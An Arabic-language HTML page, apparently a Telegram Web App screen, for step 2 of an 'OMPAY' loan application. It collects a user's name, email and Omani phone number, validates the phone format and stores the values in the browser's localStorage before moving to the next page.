<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>OMPAY - البيانات الشخصية</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --ompay-primary: #004b87;
            --ompay-hover: #003366;
            --ompay-blue-light: #0077b6;
            --bg-color: #f0f4f8;
            --card-bg: #ffffff;
            --text-main: #1e293b;
            --text-muted: #64748b;
            --input-border: #cbd5e1;
            --btn-gray: #e2e8f0;
            --btn-gray-text: #475569;
        }

        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }

        .app-header {
            width: 100%; background-color: var(--ompay-primary); height: 60px; padding: 0 20px;
            display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 100;
            border-bottom: 3px solid var(--ompay-blue-light);
        }
        .back-btn-top { color: white; text-decoration: none; font-weight: 600; font-size: 15px; cursor: pointer; display: flex; align-items: center; gap: 5px; }
        .header-title { position: absolute; left: 50%; transform: translateX(-50%); display: flex; font-size: 20px; font-weight: 800; color: white; }
        .header-title .om { color: #90e0ef; margin-left: 4px; }
        .header-title .pay { color: #ffffff; }

        .card {
            background: white; width: 90%; max-width: 440px; margin: 20px 0 30px; padding: 32px 24px;
            border-radius: 16px; box-shadow: 0 4px 20px rgba(0, 75, 135, 0.08); display: flex; flex-direction: column;
            border-top: 5px solid var(--ompay-blue-light);
        }
        .main-title { font-size: 24px; color: var(--text-main); margin: 0 0 6px; text-align: center; font-weight: 800; }
        .subtext { font-size: 14px; color: var(--text-muted); text-align: center; margin-bottom: 20px; }

        .step-indicator { display: flex; gap: 12px; margin: 0 auto 32px; width: 80%; }
        .step-bar { flex: 1; height: 4px; background-color: #e2e8f0; border-radius: 2px; }
        .step-bar.active { background-color: var(--ompay-primary); }

        .form-group { margin-bottom: 22px; display: flex; flex-direction: column; }
        .form-group label { font-size: 15px; font-weight: 700; color: #1e293b; margin-bottom: 10px; }
        .form-control {
            font-size: 15px; padding: 14px 16px; border: 1px solid var(--input-border); border-radius: 10px;
            background-color: #ffffff; color: #334155; outline: none; width: 100%; text-align: right;
        }
        .form-control:focus { border-color: var(--ompay-primary); }

        .phone-group { display: flex; gap: 10px; direction: ltr; }
        .country-prefix {
            display: flex; align-items: center; justify-content: center; gap: 6px; background-color: #f8fafc;
            border: 1px solid var(--input-border); border-radius: 10px; padding: 0 14px; font-weight: 700; font-size: 15px; color: #1e293b;
        }
        .phone-hint { font-size: 12px; color: var(--text-muted); margin-top: 8px; text-align: right; }

        .btn-container { display: flex; flex-direction: column; gap: 12px; margin-top: 20px; }
        .btn-prev { background-color: var(--btn-gray); color: var(--btn-gray-text); border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 700; cursor: pointer; }
        .btn-next { background-color: var(--ompay-primary); color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: 800; cursor: pointer; }
        .footer-banner { width: 100%; text-align: center; padding: 20px; font-size: 12px; color: #64748b; margin-top: auto; }
    </style>
</head>
<body>

<div class="app-header">
    <a onclick="goBack()" class="back-btn-top">→ رجوع</a>
    <div class="header-title">
        <span class="pay">OM</span><span class="om">PAY</span>
    </div>
    <div style="width: 24px;"></div>
</div>

<div class="card">
    <h1 class="main-title">طلب القرض</h1>
    <div class="subtext">الخطوة 2 من 3</div>

    <div class="step-indicator">
        <div class="step-bar active"></div>
        <div class="step-bar active"></div>
        <div class="step-bar"></div>
    </div>

    <form id="step2Form" onsubmit="goNext(event)">
        <div class="form-group">
            <label for="firstName">الاسم الأول</label>
            <input type="text" id="firstName" class="form-control" placeholder="أحمد" required>
        </div>

        <div class="form-group">
            <label for="lastName">اسم العائلة</label>
            <input type="text" id="lastName" class="form-control" placeholder="البلوشي" required>
        </div>

        <div class="form-group">
            <label for="email">البريد الإلكتروني</label>
            <input type="email" id="email" class="form-control" placeholder="ahmed@example.om" required>
        </div>

        <div class="form-group">
            <label for="phone">رقم هاتف OMPAY</label>
            <div class="phone-group">
                <input type="tel" id="phone" class="form-control" placeholder="91234567" maxlength="8" pattern="[97][0-9]{7}" required style="text-align: left;">
                <div class="country-prefix">
                    <span>+968</span>
                    <span>🇴🇲</span>
                </div>
            </div>
            <div class="phone-hint">8 أرقام تبدأ بـ 9 أو 7 (مثال: 91234567)</div>
        </div>

        <div class="btn-container">
            <button type="submit" class="btn-next">الخطوة التالية</button>
            <button type="button" class="btn-prev" onclick="goBack()">السابق</button>
        </div>
    </form>
</div>

<div class="footer-banner">© 2026 OMPAY سلطنة عمان</div>

<script>
    window.onload = () => {
        if (window.Telegram?.WebApp) {
            window.Telegram.WebApp.ready();
            window.Telegram.WebApp.expand();
        }
        if (localStorage.getItem('firstName')) document.getElementById('firstName').value = localStorage.getItem('firstName');
        if (localStorage.getItem('lastName')) document.getElementById('lastName').value = localStorage.getItem('lastName');
        if (localStorage.getItem('email')) document.getElementById('email').value = localStorage.getItem('email');
        if (localStorage.getItem('phone')) document.getElementById('phone').value = localStorage.getItem('phone');
    };

    function goNext(event) {
        event.preventDefault();
        const fName = document.getElementById('firstName').value.trim();
        const lName = document.getElementById('lastName').value.trim();
        const email = document.getElementById('email').value.trim();
        const phone = document.getElementById('phone').value.trim();

        if (!/^[97]\d{7}$/.test(phone)) {
            alert("يرجى إدخال رقم هاتف عماني صحيح يبدأ بـ 9 أو 7 ويتكون من 8 أرقام.");
            return;
        }

        localStorage.setItem('firstName', fName);
        localStorage.setItem('lastName', lName);
        localStorage.setItem('email', email);
        localStorage.setItem('phone', phone);
        localStorage.setItem('userPhone', phone);

        window.location.href = "/page4";
    }

    function goBack() { window.location.href = "/page2"; }
</script>
</body>
</html>
